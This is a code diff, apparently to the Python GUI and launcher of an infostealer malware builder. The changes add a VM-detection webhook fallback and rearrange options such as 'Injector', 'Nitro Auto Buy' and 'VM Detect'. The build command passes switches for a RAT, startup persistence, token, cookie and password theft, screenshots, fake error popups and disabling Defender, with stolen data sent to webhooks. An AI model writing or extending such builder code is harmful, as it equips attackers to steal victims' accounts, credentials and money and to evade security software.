@@ -269,7 +269,10 @@ def __build():
     global xraturl
     if xraturl == "":
         xraturl = ".rat"
-         
+    global xvmwebhookurl
+    if xvmwebhookurl == "":
+        xvmwebhookurl = xwehookurl
+             
     path = f'{Path(__file__).resolve().parent}\\builder.py'
     logger.info(f"Path: {path}")
     msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjection} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping} {xvmdetect} {xvmwebhookurl} {xfakeerror} {xnitrobuy} {xdefenderfucker}"
@@ -316,7 +319,9 @@ def _functions():
     with ui.column():
         with ui.expansion('System', icon='work').classes('w-full'):
             ui.checkbox('Startup', on_change=change_startups).props('inline color=pink')
-            ui.checkbox('Injector', on_change=change_injection).props('inline color=pink')
+            with ui.row():
+                _inj = ui.checkbox('Injector', on_change=change_injection).props('inline color=pink')
+                ui.checkbox('Nitro Auto Buy', on_change=change_nitrobuy).bind_visibility_from(_inj, 'value').props('inline color=pink')                                  
             ui.checkbox('Defender Fucker', on_change=change_defenderfucker).props('inline color=pink')
 
         with ui.expansion('Grabber', icon='work').classes('w-full'):
@@ -340,9 +345,8 @@ def _functions():
                         on_change=lambda e: change_ratsurl(e.value)).bind_visibility_from(_rat, 'value').props('inline color=yellow-7')
                 ui.checkbox('Ping', on_change=change_pings).props('inline color=yellow-7')
                 ui.checkbox('Fake Error', on_change=change_fakeerror).props('inline color=yellow-7')
-                ui.checkbox('Nitro Auto Buy', on_change=change_nitrobuy).props('inline color=yellow-7')
                 with ui.row():
-                    _vm = ui.checkbox('VM', on_change=change_vmdetect).props('inline color=yellow-7')
+                    _vm = ui.checkbox('VM Detect', on_change=change_vmdetect).props('inline color=yellow-7')
                     ui.input(label='VM Detection WebHook URL', placeholder='Rose on top baby',
                         on_change=lambda e: change_vmwebhookurl(e.value)).bind_visibility_from(_vm, 'value').props('inline color=yellow-7')
 
